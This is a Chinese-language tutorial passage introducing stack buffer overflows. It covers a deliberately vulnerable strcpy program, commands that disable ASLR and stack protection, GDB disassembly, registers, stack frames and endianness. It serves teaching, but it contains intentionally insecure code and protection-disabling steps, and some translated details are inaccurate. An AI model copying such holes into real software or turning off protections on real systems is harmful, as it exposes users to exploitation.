+<p>现代内存保护（<code>DEP</code>/<code>ASLR</code>）将防止缓冲区溢出造成的损坏。DEP（Data Execution  Prevention，数据执行保护），将内存区域标记为“只读”。只读内存区域是存储一些用户输入的地方（例如：堆栈），因此DEP背后的想法是防止用户将shellcode上传到内存，然后将指令指针设置为shellcode。黑客开始利用ROP（返回导向编程）来解决这个问题，因为它允许他们将shellcode上传到可执行空间，并使用现有的调用来执行它。使用ROP，攻击者需要知道存储东西的内存地址，因此防御它的方法是实现ASLR（地址空间布局随机化），它随机存储所有东西，使ROP更加困难。</p>
+<p>用户可以通过泄漏内存地址来绕过ASLR，但这使得漏洞利用不太可靠，有时甚至不可能。例如，在Windows XP（DEP/ASLR之前）上利用<a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/46763">“自由浮动FTP服务器”</a>是微不足道的。但是，如果应用程序在现代Windows Operatoring系统上运行，则存在缓冲区溢出，但由于DEP/ASLR的原因，目前利用该漏洞并不容易，因为没有已知的方法可以泄漏内存地址。</p>
+<h3 id="Vulnerable-Program"><a href="#Vulnerable-Program" class="headerlink" title="Vulnerable Program"></a>Vulnerable Program</h3><p>我们现在正在编写一个简单的C程序，名为<code>bow.c</code>，其中有一个易受攻击的函数，名为<code>strcpy()</code>。</p>
+<h4 id="Bow-c"><a href="#Bow-c" class="headerlink" title="Bow.c"></a>Bow.c</h4><p>Code:</p>
+<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">bowfunc</span><span class="params">(<span class="type">char</span> *<span class="built_in">string</span>)</span> {</span><br><span class="line"></span><br><span class="line">	<span class="type">char</span> buffer[<span class="number">1024</span>];</span><br><span class="line">	<span class="built_in">strcpy</span>(buffer, <span class="built_in">string</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> {</span><br><span class="line"></span><br><span class="line">	bowfunc(argv[<span class="number">1</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Done.\n"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>现代操作系统具有针对此类漏洞的内置保护，例如地址空间布局随机化（ASLR）。为了学习缓冲区溢出攻击的基础知识，我们将禁用此内存保护功能：</p>
+<h4 id="Disable-ASLR"><a href="#Disable-ASLR" class="headerlink" title="Disable ASLR"></a>Disable ASLR</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">student@nix-bow:~$ sudo su</span><br><span class="line">root@nix-bow:/home/student# echo 0 &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line">root@nix-bow:/home/student# cat /proc/sys/kernel/randomize_va_space</span><br><span class="line"></span><br><span class="line">0</span><br></pre></td></tr></tbody></table></figure>
+
+<p>接下来，我们将C代码编译为32位ELF二进制文件。</p>
+<h4 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">student@nix-bow:~$ gcc bow.c -o bow32 -fno-stack-protector -z execstack -m32</span><br><span class="line">student@nix-bow:~$ file bow32 | tr "," "\n"</span><br><span class="line"></span><br><span class="line">bow: ELF 32-bit LSB shared object</span><br><span class="line"> Intel 80386</span><br><span class="line"> version 1 (SYSV)</span><br><span class="line"> dynamically linked</span><br><span class="line"> interpreter /lib/ld-linux.so.2</span><br><span class="line"> for GNU/Linux 3.2.0</span><br><span class="line"> BuildID[sha1]=93dda6b77131deecaadf9d207fdd2e70f47e1071</span><br><span class="line"> not stripped</span><br></pre></td></tr></tbody></table></figure>
+
+<h3 id="Vulnerable-C-Functions"><a href="#Vulnerable-C-Functions" class="headerlink" title="Vulnerable C Functions"></a>Vulnerable C Functions</h3><p>C语言中有几个易受攻击的函数不能独立地保护内存。以下是一些函数：</p>
+<ul>
+<li><code>strcpy</code></li>
+<li><code>gets</code></li>
+<li><code>sprintf</code></li>
+<li><code>scanf</code></li>
+<li><code>strcat</code></li>
+<li>…</li>
+</ul>
+<h3 id="GDB-Introductions"><a href="#GDB-Introductions" class="headerlink" title="GDB Introductions"></a>GDB Introductions</h3><p>GDB，或GNU调试器，是由GNU项目开发的Linux系统的标准调试器。它已被移植到许多系统，并支持编程语言C，C++，J2EE-C，FORTRAN，Java等等。</p>
+<p>GDB为我们提供了通常的可跟踪性特性，如断点或堆栈跟踪输出，并允许我们干预程序的执行。例如，它还允许我们操纵应用程序的变量或独立于程序的正常执行来调用函数。</p>
+<p>我们使用<code>GNU Debugger</code>（<code>GDB</code>）在汇编器级别上查看创建的二进制文件。一旦我们用<code>GDB</code>执行了二进制文件，我们就可以反汇编程序的主函数。</p>
+<h4 id="GDB-AT-amp-T-Syntax"><a href="#GDB-AT-amp-T-Syntax" class="headerlink" title="GDB - AT&amp;T Syntax"></a>GDB - AT&amp;T Syntax</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">student@nix-bow:~$ gdb -q bow32</span><br><span class="line"></span><br><span class="line">Reading symbols from bow...(no debugging symbols found)...done.</span><br><span class="line">(gdb) disassemble main</span><br><span class="line"></span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">   0x00000582 &lt;+0&gt;: 	lea    0x4(%esp),%ecx</span><br><span class="line">   0x00000586 &lt;+4&gt;: 	and    $0xfffffff0,%esp</span><br><span class="line">   0x00000589 &lt;+7&gt;: 	pushl  -0x4(%ecx)</span><br><span class="line">   0x0000058c &lt;+10&gt;:	push   %ebp</span><br><span class="line">   0x0000058d &lt;+11&gt;:	mov    %esp,%ebp</span><br><span class="line">   0x0000058f &lt;+13&gt;:	push   %ebx</span><br><span class="line">   0x00000590 &lt;+14&gt;:	push   %ecx</span><br><span class="line">   0x00000591 &lt;+15&gt;:	call   0x450 &lt;__x86.get_pc_thunk.bx&gt;</span><br><span class="line">   0x00000596 &lt;+20&gt;:	add    $0x1a3e,%ebx</span><br><span class="line">   0x0000059c &lt;+26&gt;:	mov    %ecx,%eax</span><br><span class="line">   0x0000059e &lt;+28&gt;:	mov    0x4(%eax),%eax</span><br><span class="line">   0x000005a1 &lt;+31&gt;:	add    $0x4,%eax</span><br><span class="line">   0x000005a4 &lt;+34&gt;:	mov    (%eax),%eax</span><br><span class="line">   0x000005a6 &lt;+36&gt;:	sub    $0xc,%esp</span><br><span class="line">   0x000005a9 &lt;+39&gt;:	push   %eax</span><br><span class="line">   0x000005aa &lt;+40&gt;:	call   0x54d &lt;bowfunc&gt;</span><br><span class="line">   0x000005af &lt;+45&gt;:	add    $0x10,%esp</span><br><span class="line">   0x000005b2 &lt;+48&gt;:	sub    $0xc,%esp</span><br><span class="line">   0x000005b5 &lt;+51&gt;:	lea    -0x1974(%ebx),%eax</span><br><span class="line">   0x000005bb &lt;+57&gt;:	push   %eax</span><br><span class="line">   0x000005bc &lt;+58&gt;:	call   0x3e0 &lt;puts@plt&gt;</span><br><span class="line">   0x000005c1 &lt;+63&gt;:	add    $0x10,%esp</span><br><span class="line">   0x000005c4 &lt;+66&gt;:	mov    $0x1,%eax</span><br><span class="line">   0x000005c9 &lt;+71&gt;:	lea    -0x8(%ebp),%esp</span><br><span class="line">   0x000005cc &lt;+74&gt;:	pop    %ecx</span><br><span class="line">   0x000005cd &lt;+75&gt;:	pop    %ebx</span><br><span class="line">   0x000005ce &lt;+76&gt;:	pop    %ebp</span><br><span class="line">   0x000005cf &lt;+77&gt;:	lea    -0x4(%ecx),%esp</span><br><span class="line">   0x000005d2 &lt;+80&gt;:	ret    </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></tbody></table></figure>
+
+<p>在第一列中，十六进制数字表示<code>memory addresses</code>。带加号的数字（<code>+</code>）表示内存中的<code>address jumps</code>（以字节为单位），用于相应的指令。接下来，我们可以看到带有寄存器的<code>assembler instructions</code>（<code>mnemonics</code>）和它们的<code>operation suffixes</code>。当前的语法是<code>AT&amp;T</code>，我们可以通过<code>%</code>和<code>$</code>字符识别。</p>
+<table>
+<thead>
+<tr>
+<th>**Memory Address</th>
+<th>**Address Jumps</th>
+<th><strong>Assembler Instruction</strong></th>
+<th>**Operation Suffixes</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>0x00000582</td>
+<td>&lt;+0&gt;:【+0】：</td>
+<td>lea</td>
+<td>0x4(%esp),%ecx0x4（%esp），%ecx</td>
+</tr>
+<tr>
+<td>0x00000586</td>
+<td>&lt;+4&gt;:【+4】：</td>
+<td>and</td>
+<td>$0xfffffff0,%esp$0xfffffff0，%esp</td>
+</tr>
+<tr>
+<td>…</td>
+<td>…</td>
+<td>…</td>
+<td>…</td>
+</tr>
+</tbody></table>
+<p><code>Intel</code>语法使反汇编表示更容易阅读，我们可以通过在GDB中输入以下命令来更改语法：</p>
+<h4 id="GDB-Change-the-Syntax-to-Intel"><a href="#GDB-Change-the-Syntax-to-Intel" class="headerlink" title="GDB - Change the Syntax to Intel"></a>GDB - Change the Syntax to Intel</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">(gdb) set disassembly-flavor intel</span><br><span class="line">(gdb) disassemble main</span><br><span class="line"></span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">   0x00000582 &lt;+0&gt;:	    lea    ecx,[esp+0x4]</span><br><span class="line">   0x00000586 &lt;+4&gt;:	    and    esp,0xfffffff0</span><br><span class="line">   0x00000589 &lt;+7&gt;:	    push   DWORD PTR [ecx-0x4]</span><br><span class="line">   0x0000058c &lt;+10&gt;:	push   ebp</span><br><span class="line">   0x0000058d &lt;+11&gt;:	mov    ebp,esp</span><br><span class="line">   0x0000058f &lt;+13&gt;:	push   ebx</span><br><span class="line">   0x00000590 &lt;+14&gt;:	push   ecx</span><br><span class="line">   0x00000591 &lt;+15&gt;:	call   0x450 &lt;__x86.get_pc_thunk.bx&gt;</span><br><span class="line">   0x00000596 &lt;+20&gt;:	add    ebx,0x1a3e</span><br><span class="line">   0x0000059c &lt;+26&gt;:	mov    eax,ecx</span><br><span class="line">   0x0000059e &lt;+28&gt;:	mov    eax,DWORD PTR [eax+0x4]</span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></tbody></table></figure>
+
+<p>我们不必不断手动更改显示模式。我们也可以使用以下命令将其设置为默认语法。</p>
+<h4 id="Change-GDB-Syntax"><a href="#Change-GDB-Syntax" class="headerlink" title="Change GDB Syntax"></a>Change GDB Syntax</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">student@nix-bow:~$ echo 'set disassembly-flavor intel' &gt; ~/.gdbinit</span><br></pre></td></tr></tbody></table></figure>
+
+<p>如果我们现在重新编译GDB并反汇编main函数，我们将看到Intel语法。</p>
+<h4 id="GDB-Intel-Syntax-GDB（Intel-Syntax）"><a href="#GDB-Intel-Syntax-GDB（Intel-Syntax）" class="headerlink" title="GDB - Intel Syntax GDB（Intel Syntax）"></a>GDB - Intel Syntax GDB（Intel Syntax）</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">student@nix-bow:~$ gdb ./bow32 -q</span><br><span class="line"></span><br><span class="line">Reading symbols from bow...(no debugging symbols found)...done.</span><br><span class="line">(gdb) disassemble main</span><br><span class="line"></span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">   0x00000582 &lt;+0&gt;: 	lea    ecx,[esp+0x4]</span><br><span class="line">   0x00000586 &lt;+4&gt;: 	and    esp,0xfffffff0</span><br><span class="line">   0x00000589 &lt;+7&gt;: 	push   DWORD PTR [ecx-0x4]</span><br><span class="line">   0x0000058c &lt;+10&gt;:	push   ebp</span><br><span class="line">   0x0000058d &lt;+11&gt;:	mov    ebp,esp</span><br><span class="line">   0x0000058f &lt;+13&gt;:	push   ebx</span><br><span class="line">   0x00000590 &lt;+14&gt;:	push   ecx</span><br><span class="line">   0x00000591 &lt;+15&gt;:	call   0x450 &lt;__x86.get_pc_thunk.bx&gt;</span><br><span class="line">   0x00000596 &lt;+20&gt;:	add    ebx,0x1a3e</span><br><span class="line">   0x0000059c &lt;+26&gt;:	mov    eax,ecx</span><br><span class="line">   0x0000059e &lt;+28&gt;:	mov    eax,DWORD PTR [eax+0x4]</span><br><span class="line">   0x000005a1 &lt;+31&gt;:	add    eax,0x4</span><br><span class="line">   0x000005a4 &lt;+34&gt;:	mov    eax,DWORD PTR [eax]</span><br><span class="line">   0x000005a6 &lt;+36&gt;:	sub    esp,0xc</span><br><span class="line">   0x000005a9 &lt;+39&gt;:	push   eax</span><br><span class="line">   0x000005aa &lt;+40&gt;:	call   0x54d &lt;bowfunc&gt;</span><br><span class="line">   0x000005af &lt;+45&gt;:	add    esp,0x10</span><br><span class="line">   0x000005b2 &lt;+48&gt;:	sub    esp,0xc</span><br><span class="line">   0x000005b5 &lt;+51&gt;:	lea    eax,[ebx-0x1974]</span><br><span class="line">   0x000005bb &lt;+57&gt;:	push   eax</span><br><span class="line">   0x000005bc &lt;+58&gt;:	call   0x3e0 &lt;puts@plt&gt;</span><br><span class="line">   0x000005c1 &lt;+63&gt;:	add    esp,0x10</span><br><span class="line">   0x000005c4 &lt;+66&gt;:	mov    eax,0x1</span><br><span class="line">   0x000005c9 &lt;+71&gt;:	lea    esp,[ebp-0x8]</span><br><span class="line">   0x000005cc &lt;+74&gt;:	pop    ecx</span><br><span class="line">   0x000005cd &lt;+75&gt;:	pop    ebx</span><br><span class="line">   0x000005ce &lt;+76&gt;:	pop    ebp</span><br><span class="line">   0x000005cf &lt;+77&gt;:	lea    esp,[ecx-0x4]</span><br><span class="line">   0x000005d2 &lt;+80&gt;:	ret    </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></tbody></table></figure>
+
+<p><code>AT&amp;T</code>和<code>Intel</code>语法之间的区别不仅在于指令及其符号的表示，而且还在于执行和读取指令的顺序和方向。</p>
+<p>让我们以下面的指令为例：    </p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">0x0000058d &lt;+11&gt;:	mov    ebp,esp</span><br></pre></td></tr></tbody></table></figure>
+
+<p>使用Intel语法，我们可以将示例中的指令按以下顺序排列：</p>
+<h3 id="Intel-Syntax"><a href="#Intel-Syntax" class="headerlink" title="Intel Syntax"></a>Intel Syntax</h3><table>
+<thead>
+<tr>
+<th><strong>Instruction</strong></th>
+<th><strong><code>Destination</code></strong></th>
+<th><strong>Source</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>mov</td>
+<td><code>ebp</code></td>
+<td>esp</td>
+</tr>
+</tbody></table>
+<h3 id="AT-amp-T-Syntax-AT-T"><a href="#AT-amp-T-Syntax-AT-T" class="headerlink" title="AT&amp;T Syntax AT T"></a>AT&amp;T Syntax AT T</h3><table>
+<thead>
+<tr>
+<th><strong>Instruction指令</strong></th>
+<th><strong>Source源</strong></th>
+<th><strong><code>Destination</code></strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>mov</td>
+<td>%esp</td>
+<td><code>%ebp</code> <code>ebp</code></td>
+</tr>
+</tbody></table>
+<h2 id="CPU-Registers"><a href="#CPU-Registers" class="headerlink" title="CPU Registers"></a>CPU Registers</h2><p>寄存器是CPU的基本组成部分。几乎所有寄存器都提供少量的存储空间，用于临时存储数据。其中一些有特殊的功能。</p>
+<p>这些寄存器分为通用寄存器、控制寄存器和段寄存器。我们需要的最关键的寄存器是通用寄存器。在这些寄存器中，还进一步细分为数据寄存器、指针寄存器和索引寄存器。</p>
+<h4 id="Data-registers"><a href="#Data-registers" class="headerlink" title="Data registers"></a>Data registers</h4><table>
+<thead>
+<tr>
+<th><strong>32-bit Register</strong></th>
+<th><strong>64-bit Register</strong></th>
+<th><strong>Description</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>EAX</code></td>
+<td><code>RAX</code></td>
+<td>累加器用于输入/输出和算术运算</td>
+</tr>
+<tr>
+<td><code>EBX</code></td>
+<td><code>RBX</code></td>
+<td>基址用于索引寻址</td>
+</tr>
+<tr>
+<td><code>ECX</code></td>
+<td><code>RCX</code></td>
+<td>计数器用于循环指令和计数循环</td>
+</tr>
+<tr>
+<td><code>EDX</code></td>
+<td><code>RDX</code></td>
+<td>数据用于I/O以及涉及大值的乘法和除法运算的算术运算</td>
+</tr>
+</tbody></table>
+<h4 id="Pointer-registers"><a href="#Pointer-registers" class="headerlink" title="Pointer registers"></a>Pointer registers</h4><table>
+<thead>
+<tr>
+<th><strong>32-bit Register</strong></th>
+<th><strong>64-bit Register</strong></th>
+<th><strong>Description</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>EIP</code></td>
+<td><code>RIP</code></td>
+<td>指令指针存储下一条要执行的指令的偏移地址</td>
+</tr>
+<tr>
+<td><code>ESP</code></td>
+<td><code>RSP</code></td>
+<td>堆栈指针指向堆栈顶部</td>
+</tr>
+<tr>
+<td><code>EBP</code></td>
+<td><code>RBP</code></td>
+<td>Base Pointer也称为<code>Stack Base Pointer</code>或<code>Frame Pointer</code>，指向堆栈的底部</td>
+</tr>
+</tbody></table>
+<h3 id="Stack-Frames"><a href="#Stack-Frames" class="headerlink" title="Stack Frames"></a>Stack Frames</h3><p>由于堆栈从一个高地址开始，随着值的增加而向下增长到低内存地址，因此<code>Base Pointer</code>指向堆栈的开始（底部），而<code>Stack Pointer</code>指向堆栈的顶部。</p>
+<p>随着堆栈的增长，它在逻辑上被划分为称为<code>Stack Frames</code>的区域，这些区域在堆栈中为相应的函数分配所需的内存。堆栈帧定义了一个数据帧，其开始（<code>EBP</code>）和结束（<code>ESP</code>）在调用函数时被推入堆栈。</p>
+<p>由于堆栈存储器是建立在<code>Last-In-First-Out</code>（<code>LIFO</code>）数据结构上的，因此第一步是存储堆栈上的<code>previous EBP</code>位置，该位置可以在函数完成后恢复。如果我们现在看一下<code>bowfunc</code>函数，它在GDB中看起来像下面这样：     </p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">(gdb) disas bowfunc </span><br><span class="line"></span><br><span class="line">Dump of assembler code for function bowfunc:</span><br><span class="line">   0x0000054d &lt;+0&gt;:	    push   ebp       # &lt;---- 1. Stores previous EBP</span><br><span class="line">   0x0000054e &lt;+1&gt;:	    mov    ebp,esp</span><br><span class="line">   0x00000550 &lt;+3&gt;:	    push   ebx</span><br><span class="line">   0x00000551 &lt;+4&gt;:	    sub    esp,0x404</span><br><span class="line">   &lt;...SNIP...&gt;</span><br><span class="line">   0x00000580 &lt;+51&gt;:	leave  </span><br><span class="line">   0x00000581 &lt;+52&gt;:	ret    </span><br></pre></td></tr></tbody></table></figure>
+
+<p>堆栈帧中的<code>EBP</code>在调用函数时首先设置，并包含前一个堆栈帧的<code>EBP</code>。接下来，<code>ESP</code>的值被复制到<code>EBP</code>，创建一个新的堆栈帧。              </p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">(gdb) disas bowfunc </span><br><span class="line"></span><br><span class="line">Dump of assembler code for function bowfunc:</span><br><span class="line">   0x0000054d &lt;+0&gt;:	    push   ebp       # &lt;---- 1. Stores previous EBP</span><br><span class="line">   0x0000054e &lt;+1&gt;:	    mov    ebp,esp   # &lt;---- 2. Creates new Stack Frame</span><br><span class="line">   0x00000550 &lt;+3&gt;:	    push   ebx</span><br><span class="line">   0x00000551 &lt;+4&gt;:	    sub    esp,0x404 </span><br><span class="line">   &lt;...SNIP...&gt;</span><br><span class="line">   0x00000580 &lt;+51&gt;:	leave  </span><br><span class="line">   0x00000581 &lt;+52&gt;:	ret    </span><br></pre></td></tr></tbody></table></figure>
+
+<p>然后在堆栈中创建一些空间，将<code>ESP</code>移动到顶部，用于所需和处理的操作和变量。</p>
+<h4 id="Prologue"><a href="#Prologue" class="headerlink" title="Prologue"></a>Prologue</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">(gdb) disas bowfunc </span><br><span class="line"></span><br><span class="line">Dump of assembler code for function bowfunc:</span><br><span class="line">   0x0000054d &lt;+0&gt;:	    push   ebp       # &lt;---- 1. Stores previous EBP</span><br><span class="line">   0x0000054e &lt;+1&gt;:	    mov    ebp,esp   # &lt;---- 2. Creates new Stack Frame</span><br><span class="line">   0x00000550 &lt;+3&gt;:	    push   ebx</span><br><span class="line">   0x00000551 &lt;+4&gt;:	    sub    esp,0x404 # &lt;---- 3. Moves ESP to the top</span><br><span class="line">   &lt;...SNIP...&gt;</span><br><span class="line">   0x00000580 &lt;+51&gt;:	leave  </span><br><span class="line">   0x00000581 &lt;+52&gt;:	ret    </span><br></pre></td></tr></tbody></table></figure>
+
+<p>这三条指令代表了所谓的<code>Prologue</code>。</p>
+<p>对于退出堆栈帧，则执行相反的操作，即<code>Epilogue</code>。在尾声中，<code>ESP</code>被当前的<code>EBP</code>取代，其值被重置为之前在序言中的值。后记相对较短，除了执行它的其他可能性之外，在我们的示例中，它是用两个指令执行的：</p>
+<h4 id="Epilogue"><a href="#Epilogue" class="headerlink" title="Epilogue"></a>Epilogue</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">(gdb) disas bowfunc </span><br><span class="line"></span><br><span class="line">Dump of assembler code for function bowfunc:</span><br><span class="line">   0x0000054d &lt;+0&gt;:	    push   ebp       </span><br><span class="line">   0x0000054e &lt;+1&gt;:	    mov    ebp,esp   </span><br><span class="line">   0x00000550 &lt;+3&gt;:	    push   ebx</span><br><span class="line">   0x00000551 &lt;+4&gt;:	    sub    esp,0x404 </span><br><span class="line">   &lt;...SNIP...&gt;</span><br><span class="line">   0x00000580 &lt;+51&gt;:	leave  # &lt;----------------------</span><br><span class="line">   0x00000581 &lt;+52&gt;:	ret    # &lt;--- Leave stack frame</span><br></pre></td></tr></tbody></table></figure>
+
+<h4 id="Index-registers"><a href="#Index-registers" class="headerlink" title="Index registers"></a>Index registers</h4><table>
+<thead>
+<tr>
+<th><strong>Register 32-bit</strong></th>
+<th><strong>Register 64-bit</strong></th>
+<th><strong>Description</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>ESI</code> <code>ESP</code></td>
+<td><code>RSI</code> <code>ESP</code></td>
+<td>源索引用作字符串操作的源指针</td>
+</tr>
+<tr>
+<td><code>EDI</code> <code>ESP</code></td>
+<td><code>RDI</code> <code>ESP</code></td>
+<td>用作指向字符串操作的目的地的指针</td>
+</tr>
+</tbody></table>
+<p>关于汇编程序表示的另一个重要问题是寄存器的命名。这取决于编译二进制文件的格式。我们使用GCC编译了32位格式的<code>bow.c</code>代码。现在让我们将相同的代码编译成<code>64-bit</code>格式。</p>
+<h4 id="Compile-in-64-bit-Format"><a href="#Compile-in-64-bit-Format" class="headerlink" title="Compile in 64-bit Format"></a>Compile in 64-bit Format</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">student@nix-bow:~$ gcc bow.c -o bow64 -fno-stack-protector -z execstack -m64</span><br><span class="line">student@nix-bow:~$ file bow64 | tr "," "\n"</span><br><span class="line"></span><br><span class="line">bow64: ELF 64-bit LSB shared object</span><br><span class="line"> x86-64</span><br><span class="line"> version 1 (SYSV)</span><br><span class="line"> dynamically linked</span><br><span class="line"> interpreter /lib64/ld-linux-x86-64.so.2</span><br><span class="line"> for GNU/Linux 3.2.0</span><br><span class="line"> BuildID[sha1]=9503477016e8604e808215b4babb250ed25a7b99</span><br><span class="line"> not stripped</span><br></pre></td></tr></tbody></table></figure>
+
+<p>所以如果我们现在看一下汇编代码，我们会看到地址是32位编译二进制的两倍大，我们有几乎一半的指令。 </p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">student@nix-bow:~$ gdb -q bow64</span><br><span class="line"></span><br><span class="line">Reading symbols from bow64...(no debugging symbols found)...done.</span><br><span class="line">(gdb) disas main</span><br><span class="line"></span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">   0x00000000000006bc &lt;+0&gt;: 	push   rbp</span><br><span class="line">   0x00000000000006bd &lt;+1&gt;: 	mov    rbp,rsp</span><br><span class="line">   0x00000000000006c0 &lt;+4&gt;: 	sub    rsp,0x10</span><br><span class="line">   0x00000000000006c4 &lt;+8&gt;:  	mov    DWORD PTR [rbp-0x4],edi</span><br><span class="line">   0x00000000000006c7 &lt;+11&gt;:	mov    QWORD PTR [rbp-0x10],rsi</span><br><span class="line">   0x00000000000006cb &lt;+15&gt;:	mov    rax,QWORD PTR [rbp-0x10]</span><br><span class="line">   0x00000000000006cf &lt;+19&gt;:	add    rax,0x8</span><br><span class="line">   0x00000000000006d3 &lt;+23&gt;:	mov    rax,QWORD PTR [rax]</span><br><span class="line">   0x00000000000006d6 &lt;+26&gt;:	mov    rdi,rax</span><br><span class="line">   0x00000000000006d9 &lt;+29&gt;:	call   0x68a &lt;bowfunc&gt;</span><br><span class="line">   0x00000000000006de &lt;+34&gt;:	lea    rdi,[rip+0x9f]</span><br><span class="line">   0x00000000000006e5 &lt;+41&gt;:	call   0x560 &lt;puts@plt&gt;</span><br><span class="line">   0x00000000000006ea &lt;+46&gt;:	mov    eax,0x1</span><br><span class="line">   0x00000000000006ef &lt;+51&gt;:	leave  </span><br><span class="line">   0x00000000000006f0 &lt;+52&gt;:	ret    </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></tbody></table></figure>
+
+<p>但是，我们将首先看看易受攻击的二进制文件的32位版本。现在对我们来说最重要的指令是<code>call</code>指令。<code>call</code>指令用于调用函数并执行两个操作：</p>
+<ol>
+<li>它将返回地址推到<code>stack</code>上，以便在函数成功完成其目标后可以继续执行程序，</li>
+<li>它将<code>instruction pointer</code>（<code>EIP</code>）改变为调用目的地并在那里开始执行。</li>
+</ol>
+<h4 id="GDB-Intel-Syntax-GDB（Intel-Syntax）-1"><a href="#GDB-Intel-Syntax-GDB（Intel-Syntax）-1" class="headerlink" title="GDB - Intel Syntax GDB（Intel Syntax）"></a>GDB - Intel Syntax GDB（Intel Syntax）</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">student@nix-bow:~$ gdb ./bow32 -q</span><br><span class="line"></span><br><span class="line">Reading symbols from bow...(no debugging symbols found)...done.</span><br><span class="line">(gdb) disassemble main</span><br><span class="line"></span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">   0x00000582 &lt;+0&gt;: 	lea    ecx,[esp+0x4]</span><br><span class="line">   0x00000586 &lt;+4&gt;: 	and    esp,0xfffffff0</span><br><span class="line">   0x00000589 &lt;+7&gt;: 	push   DWORD PTR [ecx-0x4]</span><br><span class="line">   0x0000058c &lt;+10&gt;:	push   ebp</span><br><span class="line">   0x0000058d &lt;+11&gt;:	mov    ebp,esp</span><br><span class="line">   0x0000058f &lt;+13&gt;:	push   ebx</span><br><span class="line">   0x00000590 &lt;+14&gt;:	push   ecx</span><br><span class="line">   0x00000591 &lt;+15&gt;:	call   0x450 &lt;__x86.get_pc_thunk.bx&gt;</span><br><span class="line">   0x00000596 &lt;+20&gt;:	add    ebx,0x1a3e</span><br><span class="line">   0x0000059c &lt;+26&gt;:	mov    eax,ecx</span><br><span class="line">   0x0000059e &lt;+28&gt;:	mov    eax,DWORD PTR [eax+0x4]</span><br><span class="line">   0x000005a1 &lt;+31&gt;:	add    eax,0x4</span><br><span class="line">   0x000005a4 &lt;+34&gt;:	mov    eax,DWORD PTR [eax]</span><br><span class="line">   0x000005a6 &lt;+36&gt;:	sub    esp,0xc</span><br><span class="line">   0x000005a9 &lt;+39&gt;:	push   eax</span><br><span class="line">   0x000005aa &lt;+40&gt;:	call   0x54d &lt;bowfunc&gt;		# &lt;--- CALL function</span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></tbody></table></figure>
+
+<h3 id="Endianness"><a href="#Endianness" class="headerlink" title="Endianness"></a>Endianness</h3><p>在寄存器和存储器中的加载和保存操作期间，以不同的顺序读取字节。这个字节顺序称为<code>endianness</code>。Endianness在<code>little-endian</code>格式和<code>big-endian</code>格式之间进行区分。</p>
+<p><code>Big-endian</code>和<code>little-endian</code>是关于化合价的顺序。在<code>big-endian</code>中，具有最高价的数字最初是。在<code>little-endian</code>中，具有最低化合价的数字在开头。大型机处理器使用<code>big-endian</code>格式，一些RISC架构，小型计算机，在TCP/IP网络中，字节顺序也是<code>big-endian</code>格式。</p>
+<p>现在，让我们看一个具有以下值的示例：</p>
+<ul>
+<li>Address: <code>0xffff0000</code> </li>
+<li>Word: <code>\xAA\xBB\xCC\xDD</code></li>
+</ul>
+<table>
+<thead>
+<tr>
+<th><strong>Memory Address存储器地址</strong></th>
+<th><strong>0xffff0000</strong></th>
+<th><strong>0xffff0001</strong></th>
+<th><strong>0xffff0002</strong></th>
+<th><strong>0xffff0003</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Big-Endian</td>
+<td>AA</td>
+<td>BB</td>
+<td>CC</td>
+<td>DD</td>
+</tr>
+<tr>
+<td>Little-Endian</td>
+<td>DD</td>
+<td>CC</td>
+<td>BB</td>
+<td>AA</td>
+</tr>
+</tbody></table>
+<p>这对我们以后在告诉CPU它应该指向哪个地址时以正确的顺序输入代码非常重要。</p>
